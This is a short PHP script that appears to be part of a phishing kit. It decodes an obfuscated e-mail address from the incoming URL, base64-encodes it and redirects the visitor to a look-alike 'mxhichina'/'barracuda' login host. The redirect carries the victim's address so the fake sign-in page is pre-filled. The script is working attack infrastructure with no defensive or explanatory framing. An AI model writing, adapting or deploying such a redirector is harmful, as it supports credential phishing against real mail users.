<?php

$url = "$_SERVER[REQUEST_URI]";


$p0 = str_replace("/", "", $url);
$p1 = str_replace("-e8", "@", $p0);
$p2 = str_replace("-9a", ".", $p1);
$p3 = str_replace("-8e", "c", $p2);
$p4 = str_replace("-0d", "o", $p3);

$rem = str_replace("?url=https:mxhichina.web.app", "", $p4);
$remove = str_replace("?url=https://exqq.web.app", "", $rem);

$final = strtolower($remove);

function Redirect($url, $permanent = false)
{
 if (headers_sent() === false)
 {
 header('Location: ' . $url, true, ($permanent === true) ? 301 : 302);
 }

 exit();
}

Redirect("https://mxhichina.aie.ac/barracuda/?client-request-id=".base64_encode($final)."", false);

?>
